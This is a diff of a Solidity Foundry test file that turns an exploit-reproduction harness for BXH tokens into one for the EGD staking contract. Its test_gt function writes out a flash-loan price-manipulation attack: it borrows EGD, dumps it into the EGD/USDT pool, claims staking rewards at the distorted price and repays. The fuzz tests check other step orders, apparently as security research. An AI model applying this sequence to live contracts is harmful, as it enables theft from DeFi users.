@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 import "./AttackContract.sol";
-import "./BXH.sol";
-import "./BXHStaking.sol";
+import "./EGD.sol";
+import "./EGDStaking.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
 import {USDT} from "@utils/USDT.sol";
@@ -10,50 +10,50 @@ import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
 
-contract BXHTest is Test, BlockLoader {
-    BXH bxh;
+contract EGDTest is Test, BlockLoader {
+    EGD egd;
     USDT usdt;
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
-    BXHStaking bxhstaking;
+    EGDStaking egdstaking;
     AttackContract attackContract;
     address owner;
     address attacker;
-    address bxhAddr;
+    address egdAddr;
     address usdtAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
-    address bxhstakingAddr;
+    address egdstakingAddr;
     address attackContractAddr;
-    uint256 blockTimestamp = 1664374995;
-    uint112 reserve0pair = 25147468936549224419158;
-    uint112 reserve1pair = 150042582869434191452532;
-    uint32 blockTimestampLastpair = 1664360756;
-    uint256 kLastpair = 3772859961506335396254991567849051167345332565;
+    uint256 blockTimestamp = 1659914092;
+    uint112 reserve0pair = 52443151506653906536540000;
+    uint112 reserve1pair = 424456224403899287665961;
+    uint32 blockTimestampLastpair = 1659914092;
+    uint256 kLastpair = 22259713976354534524259402206876732922981387200000;
     uint256 price0CumulativeLastpair =
-        1658542015723059495128658895585784161862152;
+        17926177941217205516333779465403739154183922;
     uint256 price1CumulativeLastpair =
-        32126006449291447357830235525583796774104;
-    uint256 totalSupplybxh = 124962294544563937586572816;
-    uint256 balanceOfbxhpair = 150042582869434191452532;
-    uint256 balanceOfbxhattacker = 0;
-    uint256 balanceOfbxhbxhstaking = 0;
-    uint256 totalSupplyusdt = 4979997922170098408283526080;
-    uint256 balanceOfusdtpair = 25147468936549224419158;
+        4165161045287207174726887479302333129143660;
+    uint256 totalSupplyegd = 118000000000000000000000000;
+    uint256 balanceOfegdpair = 52443151506653906536540000;
+    uint256 balanceOfegdattacker = 0;
+    uint256 balanceOfegdegdstaking = 5670246682724687331970000;
+    uint256 totalSupplyusdt = 4979997922172658408539526080;
+    uint256 balanceOfusdtpair = 424456224403899287665961;
     uint256 balanceOfusdtattacker = 0;
-    uint256 balanceOfusdtbxhstaking = 40030764994324038311630;
+    uint256 balanceOfusdtegdstaking = 3;
 
     function setUp() public {
         owner = address(this);
-        bxh = new BXH();
-        bxhAddr = address(bxh);
+        egd = new EGD();
+        egdAddr = address(egd);
         usdt = new USDT();
         usdtAddr = address(usdt);
         pair = new UniswapV2Pair(
+            address(egd),
             address(usdt),
-            address(bxh),
             reserve0pair,
             reserve1pair,
             blockTimestampLastpair,
@@ -71,31 +71,33 @@ contract BXHTest is Test, BlockLoader {
         factoryAddr = address(factory);
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
-        bxhstaking = new BXHStaking(
-            address(bxh),
-            1 ether,
-            21543000,
-            1000,
-            owner
+        egdstaking = new EGDStaking(
+            address(egd),
+            address(usdt),
+            address(router),
+            address(pair)
         );
-        bxhstakingAddr = address(bxhstaking);
+        egdstakingAddr = address(egdstaking);
         attackContract = new AttackContract();
         attackContractAddr = address(attackContract);
         attacker = address(attackContract);
+        egd.afterDeploy(owner, attacker, address(pair), address(egdstaking));
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
-        bxh.transfer(address(pair), balanceOfbxhpair);
-        usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
+        egd.transfer(address(pair), balanceOfegdpair);
+        usdt.transfer(address(egdstaking), balanceOfusdtegdstaking);
+        egd.transfer(address(egdstaking), balanceOfegdegdstaking);
         usdt.approve(attacker, UINT256_MAX);
-        bxh.approve(attacker, UINT256_MAX);
-        bxh.transfer(address(bxhstaking), 200000 ether);
+        egd.approve(attacker, UINT256_MAX);
+        usdt.transfer(attacker, 100 ether);
+        attackContract.setUp(address(usdt), address(egdstaking));
     }
 
     function printBalance(string memory tips) public {
         emit log_string(tips);
-        emit log_string("Bxh Balances: ");
-        queryERC20BalanceDecimals(address(usdt), address(bxh), usdt.decimals());
-        queryERC20BalanceDecimals(address(bxh), address(bxh), bxh.decimals());
+        emit log_string("Egd Balances: ");
+        queryERC20BalanceDecimals(address(usdt), address(egd), usdt.decimals());
+        queryERC20BalanceDecimals(address(egd), address(egd), egd.decimals());
         emit log_string("");
         emit log_string("Usdt Balances: ");
         queryERC20BalanceDecimals(
@@ -103,7 +105,7 @@ contract BXHTest is Test, BlockLoader {
             address(usdt),
             usdt.decimals()
         );
-        queryERC20BalanceDecimals(address(bxh), address(usdt), bxh.decimals());
+        queryERC20BalanceDecimals(address(egd), address(usdt), egd.decimals());
         emit log_string("");
         emit log_string("Pair Balances: ");
         queryERC20BalanceDecimals(
@@ -111,18 +113,18 @@ contract BXHTest is Test, BlockLoader {
             address(pair),
             usdt.decimals()
         );
-        queryERC20BalanceDecimals(address(bxh), address(pair), bxh.decimals());
+        queryERC20BalanceDecimals(address(egd), address(pair), egd.decimals());
         emit log_string("");
-        emit log_string("Bxhstaking Balances: ");
+        emit log_string("Egdstaking Balances: ");
         queryERC20BalanceDecimals(
             address(usdt),
-            address(bxhstaking),
+            address(egdstaking),
             usdt.decimals()
         );
         queryERC20BalanceDecimals(
-            address(bxh),
-            address(bxhstaking),
-            bxh.decimals()
+            address(egd),
+            address(egdstaking),
+            egd.decimals()
         );
         emit log_string("");
         emit log_string("Attackcontract Balances: ");
@@ -132,9 +134,9 @@ contract BXHTest is Test, BlockLoader {
             usdt.decimals()
         );
         queryERC20BalanceDecimals(
-            address(bxh),
+            address(egd),
             address(attackContract),
-            bxh.decimals()
+            egd.decimals()
         );
         emit log_string("");
         emit log_string("");
@@ -157,19 +159,19 @@ contract BXHTest is Test, BlockLoader {
         usdt.transfer(owner, amount);
     }
 
-    function borrow_bxh(uint256 amount) internal {
-        bxh.transferFrom(owner, attacker, amount);
+    function borrow_egd(uint256 amount) internal {
+        egd.transferFrom(owner, attacker, amount);
     }
 
-    function payback_bxh(uint256 amount) internal {
-        bxh.transfer(owner, amount);
+    function payback_egd(uint256 amount) internal {
+        egd.transfer(owner, amount);
     }
 
-    function swap_pair_usdt_bxh(uint256 amount) internal {
-        usdt.approve(address(router), type(uint).max);
+    function swap_pair_egd_usdt(uint256 amount) internal {
+        egd.approve(address(router), type(uint).max);
         address[] memory path = new address[](2);
-        path[0] = address(usdt);
-        path[1] = address(bxh);
+        path[0] = address(egd);
+        path[1] = address(usdt);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             amount,
             1,
@@ -179,11 +181,11 @@ contract BXHTest is Test, BlockLoader {
         );
     }
 
-    function swap_pair_bxh_usdt(uint256 amount) internal {
-        bxh.approve(address(router), type(uint).max);
+    function swap_pair_usdt_egd(uint256 amount) internal {
+        usdt.approve(address(router), type(uint).max);
         address[] memory path = new address[](2);
-        path[0] = address(bxh);
-        path[1] = address(usdt);
+        path[0] = address(usdt);
+        path[1] = address(egd);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             amount,
             1,
@@ -197,22 +199,35 @@ contract BXHTest is Test, BlockLoader {
         pair.sync();
     }
 
-    function transaction_bxhstaking_bxh(uint256 amount) internal {
-        bxh.approve(address(bxhstaking), amount);
-        bxhstaking.deposit(address(pair), amount);
+    function transaction_egdstaking_egd(uint256 amount) internal {
+        egdstaking.claimAllReward();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_usdt(2500000e18);
+        vm.warp(block.timestamp + 60 * 60 * 24 * 10);
+        borrow_egd(500000000e18);
         printBalance("After step0 ");
-        swap_pair_usdt_bxh(usdt.balanceOf(attacker));
+
+        emit log_named_decimal_uint(
+            "[INFO] EGD/USDT Price after price manipulation",
+            egdstaking.getEGDPrice(),
+            18
+        );
+        swap_pair_egd_usdt(egd.balanceOf(attacker));
+
+        emit log_named_decimal_uint(
+            "[INFO] EGD/USDT Price after price manipulation",
+            egdstaking.getEGDPrice(),
+            18
+        );
+
         printBalance("After step1 ");
-        transaction_bxhstaking_bxh(10e18);
+        transaction_egdstaking_egd(0);
         printBalance("After step2 ");
-        swap_pair_bxh_usdt(bxh.balanceOf(attacker));
+        swap_pair_usdt_egd(420000e18);
         printBalance("After step3 ");
-        payback_usdt((2500000e18 * 1003) / 1000);
+        payback_egd((500000000e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -227,11 +242,12 @@ contract BXHTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_bxh(amt1);
-        transaction_bxhstaking_bxh(amt2);
-        swap_pair_bxh_usdt(amt3);
-        payback_usdt(amt4);
+        vm.warp(block.timestamp + 60);
+        borrow_egd(amt0);
+        swap_pair_egd_usdt(amt1);
+        transaction_egdstaking_egd(amt2);
+        swap_pair_usdt_egd(amt3);
+        payback_egd(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -245,10 +261,11 @@ contract BXHTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
+        vm.warp(block.timestamp + 60);
         borrow_usdt(amt0);
-        swap_pair_usdt_bxh(amt1);
-        transaction_bxhstaking_bxh(amt2);
-        swap_pair_bxh_usdt(amt3);
+        swap_pair_usdt_egd(amt1);
+        transaction_egdstaking_egd(amt2);
+        swap_pair_egd_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
@@ -263,11 +280,12 @@ contract BXHTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_bxh(amt0);
-        swap_pair_bxh_usdt(amt1);
-        transaction_bxhstaking_bxh(amt2);
-        swap_pair_usdt_bxh(amt3);
-        payback_bxh(amt4);
+        vm.warp(block.timestamp + 60);
+        borrow_egd(amt0);
+        swap_pair_egd_usdt(amt1);
+        transaction_egdstaking_egd(amt2);
+        swap_pair_usdt_egd(amt3);
+        payback_egd(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -282,11 +300,12 @@ contract BXHTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
+        vm.warp(block.timestamp + 60);
         borrow_usdt(amt0);
-        swap_pair_usdt_bxh(amt1);
-        transaction_bxhstaking_bxh(amt2);
-        swap_pair_bxh_usdt(amt3);
-        swap_pair_bxh_usdt(amt4);
+        swap_pair_usdt_egd(amt1);
+        transaction_egdstaking_egd(amt2);
+        swap_pair_egd_usdt(amt3);
+        swap_pair_egd_usdt(amt4);
         payback_usdt(amt5);
         assert(!attackGoal());
         vm.stopPrank();
@@ -302,12 +321,13 @@ contract BXHTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_bxh(amt0);
-        swap_pair_bxh_usdt(amt1);
-        transaction_bxhstaking_bxh(amt2);
-        swap_pair_usdt_bxh(amt3);
-        swap_pair_usdt_bxh(amt4);
-        payback_bxh(amt5);
+        vm.warp(block.timestamp + 60);
+        borrow_egd(amt0);
+        swap_pair_egd_usdt(amt1);
+        transaction_egdstaking_egd(amt2);
+        swap_pair_usdt_egd(amt3);
+        swap_pair_usdt_egd(amt4);
+        payback_egd(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -322,12 +342,13 @@ contract BXHTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_bxh(amt0);
-        swap_pair_bxh_usdt(amt1);
-        transaction_bxhstaking_bxh(amt2);
-        swap_pair_usdt_bxh(amt3);
-        swap_pair_bxh_usdt(amt4);
-        payback_bxh(amt5);
+        vm.warp(block.timestamp + 60);
+        borrow_egd(amt0);
+        swap_pair_egd_usdt(amt1);
+        transaction_egdstaking_egd(amt2);
+        swap_pair_usdt_egd(amt3);
+        swap_pair_egd_usdt(amt4);
+        payback_egd(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -343,13 +364,14 @@ contract BXHTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_bxh(amt0);
-        swap_pair_bxh_usdt(amt1);
-        transaction_bxhstaking_bxh(amt2);
-        swap_pair_usdt_bxh(amt3);
-        swap_pair_bxh_usdt(amt4);
-        swap_pair_usdt_bxh(amt5);
-        payback_bxh(amt6);
+        vm.warp(block.timestamp + 60);
+        borrow_egd(amt0);
+        swap_pair_egd_usdt(amt1);
+        transaction_egdstaking_egd(amt2);
+        swap_pair_usdt_egd(amt3);
+        swap_pair_egd_usdt(amt4);
+        swap_pair_usdt_egd(amt5);
+        payback_egd(amt6);
         assert(!attackGoal());
         vm.stopPrank();
     }
